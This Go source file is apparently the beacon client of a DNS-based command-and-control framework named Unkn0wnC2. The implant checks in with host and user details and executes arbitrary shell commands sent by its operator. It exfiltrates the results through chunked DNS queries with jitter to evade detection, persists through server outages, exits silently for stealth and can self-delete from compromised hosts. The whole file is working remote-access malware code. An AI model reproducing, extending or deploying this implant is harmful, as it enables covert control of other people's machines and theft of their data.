// Package main implements the Unkn0wnC2 DNS-based Command & Control client beacon.
// This client establishes communication with the C2 server through DNS queries,
// executes commands, and exfiltrates results using encrypted DNS traffic.
package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// Beacon represents the DNS beacon client
type Beacon struct {
	client   *DNSClient
	id       string
	hostname string
	username string
	os       string
	arch     string
	running  bool
}

// newBeacon creates a new beacon instance with system information
// including hostname, username, and operating system details.
func newBeacon() (*Beacon, error) {
	client := newDNSClient()

	// Generate unique beacon ID
	hostname, _ := os.Hostname()
	beaconID := generateBeaconID(hostname)

	// Get system info
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME") // Windows
	}
	if username == "" {
		username = "unknown"
	}

	return &Beacon{
		client:   client,
		id:       beaconID,
		hostname: hostname,
		username: username,
		os:       runtime.GOOS,
		arch:     runtime.GOARCH,
		running:  false,
	}, nil
}

// generateBeaconID creates a unique 4-character beacon identifier
// based on MD5 hash of the hostname for C2 tracking.
func generateBeaconID(hostname string) string {
	hash := md5.Sum([]byte(hostname + fmt.Sprintf("%d", time.Now().Unix())))
	return fmt.Sprintf("%x", hash)[:4]
}

// checkIn sends a beacon check-in to the DNS server
func (b *Beacon) checkIn() (string, error) {
	// Create check-in message with system info (limit length for DNS)
	shortHostname := b.hostname
	if len(shortHostname) > 10 {
		shortHostname = shortHostname[:10]
	}
	shortUsername := b.username
	if len(shortUsername) > 8 {
		shortUsername = shortUsername[:8]
	}
	shortOS := b.os
	if len(shortOS) > 7 {
		shortOS = shortOS[:7]
	}
	shortArch := b.arch
	if len(shortArch) > 6 {
		shortArch = shortArch[:6]
	}
	checkInData := fmt.Sprintf("CHK|%s|%s|%s|%s|%s",
		b.id, shortHostname, shortUsername, shortOS, shortArch)

	// Send check-in via DNS query
	response, err := b.client.sendCommand(checkInData)
	if err != nil {
		return "", fmt.Errorf("check-in failed: %v", err)
	}

	return response, nil
}

// compressOutput compresses large output using gzip and base64 encoding
// Returns compressed data with a prefix marker if compression was applied
func compressOutput(data string) string {
	// Only compress if output is larger than 1KB
	if len(data) < 1024 {
		return data
	}

	var buf bytes.Buffer
	gzWriter := gzip.NewWriter(&buf)

	_, err := gzWriter.Write([]byte(data))
	if err != nil {
		return data // Return original on compression error
	}

	if err := gzWriter.Close(); err != nil {
		return data // Return original on close error
	}

	compressed := buf.Bytes()

	// Only use compression if it actually reduces size by at least 20%
	if len(compressed) < len(data)*4/5 {
		encoded := base64.StdEncoding.EncodeToString(compressed)
		return "GZIP:" + encoded
	}

	return data
}

// executeCommand runs a system command and returns the output
// Commands are subject to a 5-minute timeout to prevent hanging
func (b *Beacon) executeCommand(command string) string {
	// Add panic recovery to prevent beacon crash on command execution errors
	defer func() {
		if r := recover(); r != nil {
			// Log panic to stderr for debugging (will be captured in command output if redirected)
			fmt.Fprintf(os.Stderr, "[Beacon] Panic during command execution: %v\n", r)
		}
	}()

	// Check for special commands
	if command == "selfdestruct" || command == "uninstall" {
		return b.selfDestruct()
	}

	// Create context with timeout (5 minutes default)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	var cmd *exec.Cmd

	// Choose appropriate shell based on OS with fallback for embedded systems
	switch runtime.GOOS {
	case "windows":
		cmd = exec.CommandContext(ctx, "cmd", "/c", command)
	default:
		// Try to find a working shell (important for embedded ARM devices)
		shell := "/bin/sh"
		if _, err := os.Stat("/bin/bash"); err == nil {
			shell = "/bin/bash"
		} else if _, err := os.Stat("/bin/ash"); err == nil {
			// Alpine Linux / busybox (common on embedded systems)
			shell = "/bin/ash"
		}
		cmd = exec.CommandContext(ctx, shell, "-c", command)
	}

	// Capture output with separate stdout/stderr for better error visibility
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Execute command
	err := cmd.Run()

	// Combine output
	output := stdout.String()
	if stderr.Len() > 0 {
		if len(output) > 0 {
			output += "\n"
		}
		output += stderr.String()
	}

	// Check for timeout
	if ctx.Err() == context.DeadlineExceeded {
		return fmt.Sprintf("Error: Command timed out after 5 minutes\nPartial output: %s", output)
	}

	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, output)
	}

	// Truncate output if too large (especially important for 32-bit ARM)
	maxOutputSize := 1024 * 1024 // 1MB limit for 64-bit
	if runtime.GOARCH == "arm" || runtime.GOARCH == "386" {
		maxOutputSize = 512 * 1024 // 512KB for 32-bit architectures
	}

	if len(output) > maxOutputSize {
		output = output[:maxOutputSize] + "\n[OUTPUT TRUNCATED - exceeded " +
			fmt.Sprintf("%dKB", maxOutputSize/1024) + " limit]"
	}

	// Return raw result - compression removed to support large chunked exfils
	return output
}

// selfDestruct removes the beacon binary and exits
// This command allows operators to cleanly remove the beacon from compromised systems
func (b *Beacon) selfDestruct() string {
	b.running = false // Stop the beacon loop

	exePath, err := os.Executable()
	if err != nil {
		return fmt.Sprintf("Self-destruct failed: unable to determine executable path: %v", err)
	}

	// Schedule deletion after exit
	go func() {
		time.Sleep(2 * time.Second)

		var cmd *exec.Cmd
		switch runtime.GOOS {
		case "windows":
			// Use cmd to delete after a delay
			cmd = exec.Command("cmd", "/c", "timeout /t 3 /nobreak && del /f /q", exePath)
		default:
			// Use sh to delete after a delay
			cmd = exec.Command("sh", "-c", fmt.Sprintf("sleep 3 && rm -f '%s'", exePath))
		}

		cmd.Start()
		os.Exit(0)
	}()

	return "Self-destruct initiated. Beacon will terminate and remove itself in 3 seconds."
}

// exfiltrateResult sends command results back via DNS using three-phase protocol:
// 1. RESULT_META - announces incoming result with total size and chunk count
// 2. DATA chunks - sends result data in manageable pieces
// 3. RESULT_COMPLETE - signals all chunks sent successfully
// This ensures Master never marks tasks complete until beacon confirms completion
func (b *Beacon) exfiltrateResult(result string, taskID string) error {
	maxCmd := b.client.config.MaxCommandLength
	if maxCmd <= 64 {
		maxCmd = 800 // sensible default for chunked results
	}

	// Conservative estimate for overhead
	overhead := 100
	safeRawChunk := (maxCmd - overhead) / 2
	if safeRawChunk < 8 {
		safeRawChunk = 8 // minimum viable chunk
	}
	if safeRawChunk > 50 {
		safeRawChunk = 50 // conservative max to avoid DNS issues
	}

	// ALWAYS use chunked protocol (even for small results) to avoid ambiguity
	// Phase 1: Send metadata about the incoming chunked result with retries
	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk
	if totalChunks == 0 {
		totalChunks = 1 // Empty result still needs 1 chunk
	}

	metaData := fmt.Sprintf("RESULT_META|%s|%s|%d|%d", b.id, taskID, len(result), totalChunks)

	// Retry metadata send up to 3 times - critical for establishing expectation
	var err error
	metaSent := false
	for metaAttempt := 1; metaAttempt <= 3; metaAttempt++ {
		_, err = b.client.sendCommand(metaData)
		if err == nil {
			metaSent = true
			break
		}
		if metaAttempt < 3 {
			time.Sleep(time.Duration(metaAttempt) * time.Second)
		}
	}

	if !metaSent {
		return fmt.Errorf("failed to send result metadata after 3 attempts: %v", err)
	}

	// Get jitter configuration
	jitterMin := b.client.config.ExfilJitterMinMs
	jitterMax := b.client.config.ExfilJitterMaxMs
	chunksPerBurst := b.client.config.ExfilChunksPerBurst
	burstPause := b.client.config.ExfilBurstPauseMs

	// Defaults if not configured
	if jitterMin <= 0 {
		jitterMin = 1000 // 1 second
	}
	if jitterMax < jitterMin {
		jitterMax = jitterMin + 1000
	}
	if chunksPerBurst <= 0 {
		chunksPerBurst = 10
	}
	if burstPause <= 0 {
		burstPause = 5000 // 5 seconds
	}

	// Phase 2: Send the actual data chunks with burst-based jitter and per-chunk retry
	failedChunks := 0
	for i := 0; i < totalChunks; i++ {
		start := i * safeRawChunk
		end := start + safeRawChunk
		if end > len(result) {
			end = len(result)
		}

		chunk := result[start:end]
		chunkData := fmt.Sprintf("DATA|%s|%s|%d|%s", b.id, taskID, i+1, chunk)

		// Retry each chunk up to 2 times before giving up
		chunkSent := false
		for chunkAttempt := 1; chunkAttempt <= 2; chunkAttempt++ {
			_, err := b.client.sendCommand(chunkData)
			if err == nil {
				chunkSent = true
				break
			}
			// Brief pause before retry
			if chunkAttempt < 2 {
				time.Sleep(500 * time.Millisecond)
			}
		}

		if !chunkSent {
			failedChunks++
			// Don't abort immediately - try to send remaining chunks
			// Server can handle partial results
		}

		// Apply delay after each burst
		if (i+1)%chunksPerBurst == 0 && i+1 < totalChunks {
			// Burst complete - apply jitter + burst pause
			jitterDelay := jitterMin + rand.Intn(jitterMax-jitterMin+1)
			totalDelay := time.Duration(jitterDelay+burstPause) * time.Millisecond
			time.Sleep(totalDelay)
		} else if i+1 < totalChunks {
			// Within burst - small delay for DNS rate limiting
			time.Sleep(time.Duration(100+rand.Intn(400)) * time.Millisecond)
		}
	}

	if failedChunks > 0 {
		return fmt.Errorf("failed to send %d/%d chunks", failedChunks, totalChunks)
	}

	// Phase 3: Send completion message to signal all chunks sent successfully
	completeData := fmt.Sprintf("RESULT_COMPLETE|%s|%s|%d", b.id, taskID, totalChunks)
	for attempt := 1; attempt <= 3; attempt++ {
		_, err = b.client.sendCommand(completeData)
		if err == nil {
			return nil // Success
		}
		if attempt < 3 {
			time.Sleep(time.Duration(attempt) * time.Second)
		}
	}

	return fmt.Errorf("failed to send completion message after 3 attempts: %v", err)
}

// parseTask parses a task from the DNS server response
func (b *Beacon) parseTask(response string) (taskID, command string, isTask bool) {
	// Expected format: TASK|taskID|command
	parts := strings.SplitN(response, "|", 3)

	if len(parts) >= 3 && parts[0] == "TASK" {
		return parts[1], parts[2], true
	}

	return "", "", false
}

// handleUpdateDomains updates the beacon's DNS domain list
func (b *Beacon) handleUpdateDomains(domainsJSON string) {
	// Parse JSON array of domains
	domainsJSON = strings.TrimSpace(domainsJSON)
	if !strings.HasPrefix(domainsJSON, "[") || !strings.HasSuffix(domainsJSON, "]") {
		return // Invalid format
	}

	// Simple JSON array parser (domains should be strings)
	domainsJSON = strings.TrimPrefix(domainsJSON, "[")
	domainsJSON = strings.TrimSuffix(domainsJSON, "]")

	var newDomains []string
	for _, domain := range strings.Split(domainsJSON, ",") {
		domain = strings.Trim(strings.TrimSpace(domain), "\"")
		if domain != "" {
			newDomains = append(newDomains, domain)
		}
	}

	if len(newDomains) > 0 {
		// Update client domains without resetting domain index
		// This ensures Shadow Mesh rotation continues smoothly
		b.client.mutex.Lock()
		oldDomains := b.client.config.DNSDomains
		b.client.config.DNSDomains = newDomains
		// DON'T reset domainIndex - let Shadow Mesh selection continue
		// The selectDomain() function will handle the new domain list correctly
		// Reset failed domain tracking to give new servers a chance
		b.client.failedDomains = make(map[string]time.Time)
		b.client.mutex.Unlock()
		_ = oldDomains // Prevent unused variable warning
	}
}

// sendResult sends a task result back to the C2
func (b *Beacon) sendResult(taskID, result string) error {
	return b.exfiltrateResult(result, taskID) // Fix: parameters were reversed
}

// runBeacon starts the beacon loop
func (b *Beacon) runBeacon() {
	b.running = true

	// Main beacon loop with randomized sleep intervals
	sleepMin := b.client.config.SleepMin
	sleepMax := b.client.config.SleepMax

	if sleepMin <= 0 {
		sleepMin = 5 // Default minimum 5 seconds
	}
	if sleepMax <= sleepMin {
		sleepMax = sleepMin + 10 // Default maximum
	}

	// CRITICAL: Beacon NEVER exits, even if all C2 servers are down
	// This allows operators to tear down and rebuild infrastructure
	// while beacons continue to persist and automatically reconnect
	for b.running {
		// Randomize sleep interval between min and max for OPSEC
		sleepDuration := time.Duration(sleepMin+rand.Intn(sleepMax-sleepMin+1)) * time.Second
		time.Sleep(sleepDuration)

		// Send check-in - if it fails, beacon continues trying
		response, err := b.checkIn()
		if err != nil {
			continue
		}

		// Check for DOMAINS response (sent on first check-in)
		if strings.HasPrefix(response, "DOMAINS|") {
			domainList := response[8:] // Skip "DOMAINS|"
			parts := strings.Split(domainList, ",")
			var incoming []string
			seen := make(map[string]bool)
			for _, domain := range parts {
				domain = strings.TrimSpace(domain)
				if domain == "" || seen[domain] {
					continue
				}
				incoming = append(incoming, domain)
				seen[domain] = true
			}

			b.client.mutex.Lock()
			existing := b.client.config.DNSDomains
			merged := make([]string, 0, len(incoming)+len(existing))
			seen = make(map[string]bool)
			for _, domain := range incoming {
				if !seen[domain] {
					merged = append(merged, domain)
					seen[domain] = true
				}
			}
			for _, domain := range existing {
				if !seen[domain] {
					merged = append(merged, domain)
					seen[domain] = true
				}
			}
			if len(merged) == 0 && len(existing) > 0 {
				merged = existing
			}
			if len(merged) > 0 {
				b.client.config.DNSDomains = merged
				if len(merged) > 0 {
					b.client.domainIndex %= len(merged)
				}
				last := b.client.lastDomain
				if last != "" {
					stillPresent := false
					for _, domain := range merged {
						if domain == last {
							stillPresent = true
							break
						}
					}
					if !stillPresent {
						b.client.lastDomain = ""
					}
				}
			}
			b.client.mutex.Unlock()

			// Continue to next check-in cycle
			continue
		}

		// Check if server has a task for us
		taskID, command, isTask := b.parseTask(response)
		if isTask {
			// Wrap task execution in panic recovery to prevent beacon crash
			func() {
				defer func() {
					if r := recover(); r != nil {
						errorMsg := fmt.Sprintf("Task execution panic: %v", r)
						// Try to report the error back to C2
						b.exfiltrateResult(errorMsg, taskID)
					}
				}()

				// Check for special commands
				if strings.HasPrefix(command, "update_domains:") {
					// Special system command to update DNS domain list
					domainsJSON := command[15:] // Skip "update_domains:" prefix

					// Update the domain list
					b.handleUpdateDomains(domainsJSON)

					// NOTE: We don't send a result for update_domains tasks
					// The beacon will naturally check in to the new DNS servers in the next cycle
					// Sending a RESULT would cause the new DNS server to receive it immediately,
					// which looks like a task result instead of a check-in

					// Continue to next check-in cycle immediately
					// The sleep will happen at the top of the loop, then check-in will use the new domain list
					return
				}

				// Execute regular command
				result := b.executeCommand(command)

				// Exfiltrate the result with retries
				maxRetries := 3
				for attempt := 1; attempt <= maxRetries; attempt++ {
					err := b.exfiltrateResult(result, taskID)
					if err == nil {
						break // Success
					}
					// Failed - retry with exponential backoff
					if attempt < maxRetries {
						backoff := time.Duration(attempt*2) * time.Second
						time.Sleep(backoff)
					}
				}
			}()

			// If update_domains was processed, the closure returned early
			// Continue to next cycle
			if strings.HasPrefix(command, "update_domains:") {
				continue
			}
		}
	}
}

// main function - entry point
func main() {
	// Random number generator auto-seeded in Go 1.20+
	// No explicit seed needed for randomized sleep intervals

	// Create beacon with embedded configuration
	beacon, err := newBeacon()
	if err != nil {
		os.Exit(1) // Silent exit for stealth
	}

	// Handle Ctrl+C gracefully
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		beacon.running = false
		time.Sleep(1 * time.Second)
		os.Exit(0)
	}()

	// Start the beacon
	beacon.runBeacon()
}
